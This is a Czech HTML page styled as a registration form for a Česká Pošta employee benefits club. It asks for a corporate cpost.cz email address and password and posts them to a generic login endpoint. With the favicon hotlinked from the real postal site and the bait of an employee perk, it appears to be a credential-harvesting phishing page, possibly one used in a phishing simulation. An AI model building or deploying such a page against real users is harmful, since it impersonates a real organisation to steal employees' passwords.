<!DOCTYPE html>
<html lang="cs">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link href="https://www.ceskaposta.cz/CeskaPosta-theme/images/favicon.ico" rel="Shortcut Icon">

    <title>Česká Pošta club - Registrace</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <a href="/">
            <img src="./img/banner2.png" alt="Česká Pošta logo" class="logoImg">
        </a>

        <fieldset>
            <h2>Registrace</h2>
            Zde se můžete zaregistrovat do zaměstnaneckého benefičního programu Club Česká Pošta.
            <br>
            <form action="/postDefaultLogin" method="POST">
                <input type="email" name="email" id="email" placeholder="email@cpost.cz" required oninvalid="this.setCustomValidity('Zadejte prosím mail v platném formátu.')">
                <br>
                <input type="password" name="password" id="password" placeholder="vaše heslo" requred>
                <br>
                <input type="submit" value="Registrovat">
            </form>

            <p>
                <a href="/zapomenute-heslo">Zapomeněli jste své heslo?</a>
                <br>
                <a href="/vlastni-email">Nemám vlastní emailovou adresu u cpost.cz</a>
            </p>
        </fieldset>
    </div>
</body>
</html>
